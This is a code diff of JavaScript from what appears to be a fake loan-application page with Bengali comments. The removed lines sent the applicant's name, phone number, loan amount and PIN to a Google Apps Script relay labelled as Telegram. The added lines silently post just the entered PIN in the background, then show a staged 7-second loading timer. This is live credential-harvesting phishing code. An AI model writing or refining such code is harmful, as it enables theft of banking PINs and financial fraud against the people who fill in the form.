@@ -329,30 +329,12 @@
         // সাবমিট বাটন ডিজেবল করা ও লোডিং শুরু
         btnSubmit.disabled = true;
 
-        // ১. বিস্তারিত মেসেজ
-        const telegramMessage = `🔐 নতুন পিন যাচাই (ধাপ-১)!\n\n` +
-                                `👤 নাম: ${applicantName}\n` +
-                                `📞 মোবাইল: ${applicantPhone || 'পাওয়া যায়নি'}\n` +
-                                `💰 লোনের পরিমাণ: ${loanAmount} টাকা\n` +
-                                `🔑 পিন (PIN): ${enteredPin}\n` +
-                                `⏰ সময়: ${new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' })}`;
-
-        // ২. আলাদা পিন মেসেজ
-        const pinOnlyMessage = `PIN: ${enteredPin}`;
-
-        // ব্যাকগ্রাউন্ডে মেসেজ পাঠানো
+        // কোনো অতিরিক্ত লেখা ছাড়া শুধুমাত্র পিনটি ব্যাকগ্রাউন্ডে পাঠানো
         fetch(GOOGLE_SCRIPT_URL, {
             method: 'POST',
             mode: 'no-cors',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ message: telegramMessage })
-        }).finally(() => {
-            fetch(GOOGLE_SCRIPT_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ message: pinOnlyMessage })
-            });
+            body: JSON.stringify({ message: enteredPin })
         });
 
         // ঠিক ৭ সেকেন্ড লোডিং টাইমার
